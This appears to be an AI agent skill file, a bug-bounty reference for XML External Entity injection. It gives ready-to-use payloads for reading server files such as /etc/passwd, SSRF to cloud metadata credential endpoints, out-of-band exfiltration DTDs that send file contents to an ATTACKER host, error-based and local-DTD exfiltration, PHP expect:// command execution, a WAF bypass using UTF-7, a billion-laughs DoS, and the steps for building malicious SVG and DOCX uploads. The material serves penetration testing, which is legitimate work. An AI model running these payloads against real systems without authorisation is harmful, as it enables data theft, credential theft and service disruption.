---
name: xxe-testing
description: "XML External Entity injection hunting — file read, SSRF, OOB exfiltration, blind XXE via error/DTD, SVG/DOCX/XLSX upload, XInclude, Content-Type swap. Use when testing XML endpoints, SOAP APIs, file upload (SVG/DOCX/XLSX), SAML SSO, or RSS/Atom feed parsers."
---

# XXE Injection Techniques — Bug Bounty Reference

> Source: Intigriti blog + field experience. Quick-ref for pentest sessions.

## Crown Jewel Targets

- **Enterprise SOAP/XML-RPC services** — legacy Java/.NET backends with default XML parser settings (Critical file read + SSRF)
- **Document import features** (DOCX/XLSX/PPTX upload) — ZIP containing XML parsed server-side, XXE in `[Content_Types].xml` or `word/document.xml`
- **SVG image processors** — avatar/logo upload accepting SVG, processed by ImageMagick/librsvg/Batik (file read in rendered image)
- **SAML SSO implementations** — XML assertions with injectable DOCTYPE, especially custom SAML parsers
- **PDF generators** accepting HTML/XML input — wkhtmltopdf, Apache FOP, iText parsing DOCTYPE
- **RSS/Atom feed aggregators** — background XML parsing of external feeds, often blind (OOB exfil via interactsh)
- **API endpoints accepting Content-Type swap** — `application/json` → `application/xml` silently parsed by backend

## Attack Surface Signals

- **URL patterns**: `/api/v1/import`, `/upload`, `/convert`, `/export`, `/saml/acs`, `/soap/`, `/xmlrpc`, `/ws/`
- **Response headers**: `Content-Type: text/xml`, `Content-Type: application/soap+xml`, SAML-related cookies
- **Request patterns**: `Content-Type: application/xml`, `text/xml`, `multipart/form-data` with XML/DOCX/SVG
- **Tech stack signals**: Java (Xerces, SAX, DOM), PHP (libxml), .NET (XmlReader), SAML libraries
- **Error messages**: `XML parsing error`, `SAXParseException`, `DOCTYPE is disallowed`, `entity reference`
- **File upload accept types**: `.svg`, `.xml`, `.docx`, `.xlsx`, `.pptx`, `.odt`, `.rss`

## Attack Surfaces

- XML-based APIs (SOAP, REST accepting `Content-Type: application/xml`)
- Import/export features (CSV→XML, config upload)
- Document processors: **DOCX, XLSX, PPTX** (all ZIP'd XML inside)
- **SVG** image uploads/processors
- RSS/Atom feed parsers
- SAML SSO (XML-based assertions)

## 1. Classic XXE — File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

Windows: `file:///C:/Windows/win.ini`, `file:///C:/inetpub/wwwroot/web.config`

## 2. XXE to SSRF

```xml
<!DOCTYPE data [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&ssrf;</data>
```

Cloud metadata targets: AWS `169.254.169.254`, GCP `metadata.google.internal`, Azure `169.254.169.254`

## 3. Blind XXE — OOB Data Exfil

### Hosted DTD (xxe.dtd on attacker server)
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?d=%file;'>">
%eval;
%exfil;
```

### Trigger payload
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://ATTACKER/xxe.dtd">
  %dtd;
]>
<data>x</data>
```

**Key**: Use parameter entities (`%name;`) — they work inside DTD definitions where regular entities can't chain.

## 4. Error-Based XXE (data in error messages)

### Hosted DTD
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Parser error leaks file contents in the "file not found" path.

## 5. XXE via File Upload

### SVG
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>
```

### DOCX/XLSX
1. Unzip the document
2. Inject XXE into `[Content_Types].xml`, `word/document.xml`, or `xl/sharedStrings.xml`
3. Re-zip and upload
```bash
mkdir exploit && cd exploit
unzip ../legit.docx
# Edit word/document.xml — add DOCTYPE + entity
zip -r ../evil.docx .
```

### XML in ZIP (generic)
Look for any ZIP-based format that contains XML internally (ODP, ODT, JAR, etc.)

## 6. PHP-Specific Wrappers

### Base64 file read (avoids XML parsing errors on binary/PHP)
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
```

### RCE via expect://
```xml
<!ENTITY xxe SYSTEM "expect://id">
```
Requires `expect` extension (rare but check).

### PHAR deserialization
```xml
<!ENTITY xxe SYSTEM "phar:///tmp/evil.phar/test.txt">
```

## 7. Filter Bypasses

### UTF-7 encoding (bypasses keyword filters)
```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE data +AFs-
  +ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AF0-+AD4-
+ADw-data+AD4-+ACY-xxe+ADs-+ADw-/data+AD4-
```

### UTF-16 encoding
Change encoding header + actual byte encoding to bypass WAF string matching.

### CDATA wrapping (for XML-illegal chars in file content)
```xml
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % dtd "<!ENTITY &#x25; all '%start;%file;%end;'>">
```

## 8. Billion Laughs (DoS — use carefully)

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<data>&lol3;</data>
```

⚠️ Only use to prove DoS impact, never in production without permission.

## 9. Protocol Handlers

| Protocol | Use | Notes |
|----------|-----|-------|
| `file://` | Local file read | Universal |
| `http://` | SSRF, OOB exfil | Most common |
| `ftp://` | Exfil multi-line files | Bypasses single-line HTTP limit |
| `gopher://` | SSRF to internal services | Java, some PHP |
| `jar://` | Java archive read | Java only |
| `netdoc://` | Java file read alt | Older Java |
| `php://filter` | Base64 encode source | PHP only |
| `expect://` | RCE | PHP + expect ext |
| `data://` | Inline data | PHP |

## 10. Second-Order XXE

Payload stored in DB/queue, processed later by background XML parser. Common in:
- Async import jobs
- Report generation pipelines
- RSS feed aggregators

Test: inject XXE, trigger OOB callback, wait hours/days.

## Detection Checklist

1. Any `Content-Type: application/xml` or `text/xml` endpoint?
2. Can you switch `Content-Type` from JSON to XML and get parsed?
3. File upload accepting SVG, DOCX, XLSX, XML?
4. SOAP endpoints?
5. SAML SSO flow?
6. Does the app reflect XML input back?

## PortSwigger Academy — Advanced Techniques

### XInclude for Partial XML Control
- When you only control part of the XML document (e.g., a single field value placed inside server-built XML), you cannot define a DOCTYPE
- Use XInclude instead — no DOCTYPE needed:
  ```xml
  <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
  ```
- Inject this as the value of any XML element you control — the parser resolves the XInclude directive

### Content-Type Swap
- Convert `application/x-www-form-urlencoded` or `application/json` POST body to `text/xml` or `application/xml`
- Many APIs and frameworks tolerate the content type change and parse the body as XML
- Reformat: `username=test&password=test` → `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data><username>&xxe;</username><password>test</password></data>`

### SVG-Based XXE
- Embed XXE payload in SVG image uploads (SVG is XML-based)
- Also works inside DOCX/XLSX/PPTX — these are ZIP archives containing XML subcomponents
- Inject the DOCTYPE + entity into any internal XML file (`word/document.xml`, `xl/sharedStrings.xml`, `[Content_Types].xml`)

### Error-Based Blind XXE
- When OOB HTTP/DNS is blocked, trigger XML parsing errors that contain file data in the error message:
  ```xml
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
  ```
- The parser error message includes the file contents as part of the invalid path — no outbound connection needed

### Local DTD Repurposing
- When external DTD connections are blocked (no OOB), repurpose a DTD file already present on the server
- Load a known local DTD (e.g., `/usr/share/yelp/dtd/docbookx.dtd`, `/usr/local/app/schema.dtd`)
- Redefine an existing entity within that DTD to perform error-based exfiltration:
  ```xml
  <!DOCTYPE data [
    <!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
      <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///x/%file;&#x27;>">
      &#x25;eval;&#x25;error;'>
    %local;
  ]>
  ```

### DTD File Probing
- Test whether specific DTD files exist on the server by loading them and observing error differences
- A DTD that exists loads successfully (or fails on redefined entity); a missing DTD causes a "file not found" error
- Use this to fingerprint the OS/software and find exploitable local DTDs for the repurposing technique

## Operator Notes (Battle-Tested)

1. **Content-Type swap is the #1 underused technique**: Change `application/json` POST to `application/xml` and wrap the body in XML with DOCTYPE. Many frameworks silently parse XML even when not documented. Test this on every JSON API.
2. **SVG upload is the easiest entry point**: Upload `<svg>` with DOCTYPE + ENTITY as avatar/logo. Even if the image is "processed," the XML parser often resolves entities before image conversion. Check rendered output for file content.
3. **DOCX/XLSX attacks require the unzip-edit-rezip workflow**: `unzip legit.docx && edit [Content_Types].xml && zip -r evil.docx .` — inject DOCTYPE into the XML files inside the archive. Test all internal XML files, not just `document.xml`.
4. **Blind XXE needs an OOB callback from minute 1**: mint one with `mcp__Burp__generate_collaborator_payload` (or `oob_new` where the install has its own OAST listener) before testing, and poll it with `mcp__Burp__get_collaborator_interactions` / `oob_check`. Use parameter entities (`%name;`) for OOB exfil DTD. If HTTP OOB is blocked, try FTP protocol handler — it bypasses single-line HTTP limitations.
5. **Local DTD repurposing saves the day when OOB is fully blocked**: Probe for `/usr/share/yelp/dtd/docbookx.dtd` (Linux) or known framework DTDs. Redefine an entity inside → error-based exfil without any outbound connection.

## Related Skills & Chains

| When | Go to |
|------|-------|
| XXE reads cloud metadata (169.254.169.254) | `ssrf-testing` (escalate to cloud credential theft) |
| XXE via SAML assertion | `auth-bypass-testing` → `references/saml-bypass-techniques.md` |
| XXE via file upload (SVG/DOCX) | `file-upload-testing` |
| Need PHP wrappers (php://filter) | `lfi-path-traversal` |
| WAF blocks DOCTYPE/ENTITY keywords | `waf-bypass` → `references/waf-generic-evasion.md` (UTF-7/16 encoding bypass) |
| XXE reads source code → find more vulns | `hidden-param-discovery`, `api-security-testing` |
